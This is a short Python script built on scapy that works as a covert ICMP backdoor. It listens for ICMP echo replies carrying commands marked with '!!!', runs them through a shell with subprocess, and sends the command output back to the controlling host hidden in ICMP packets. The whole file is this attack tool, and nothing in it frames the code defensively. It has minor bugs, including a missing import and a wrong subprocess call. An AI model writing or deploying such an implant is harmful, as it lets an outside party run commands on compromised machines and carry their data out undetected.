from scapy.all import *
from scapy.all import IP,ICMP
from subprocess import Popen, PIPE

global SSM

def send_over_icmp(server, response):
    serverresponse = "###" + response
    evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
    send(evil)

def execute_command(server, command):
    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    output, error = p.communicate()
    send_over_icmp(server, str(output))

def reply(src, command):
    if command == "PING":
            send_over_icmp(src, "PONG")
    else:
        send_over_icmp(src, "ACKNOWLEDGED")

def handle(pkt):
    global SSM
    src = pkt[IP].dst
    payload = str(pkt.payload)
    parsed = re.split('!{3}', payload)
    if len(parsed) == 1:
        return
    else: 
        command = parsed[1][:-1]
        if command[0] == "0" and command[1] == "0":
            SSM = False
            execute = False
        elif command[0] == "$" and command[1] == "0":
            SSM = True
            execute = False
        elif command[0] != "$" and command[1] == "1":
            SSM = True
            execute = False
        elif command[0] != "0" and command[1] == "1":
            SSM = False
            execute = True

        command = command[2:]
        if execute:
            execute_command(src, command)
        else:
            reply(src, command)
    
        

sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
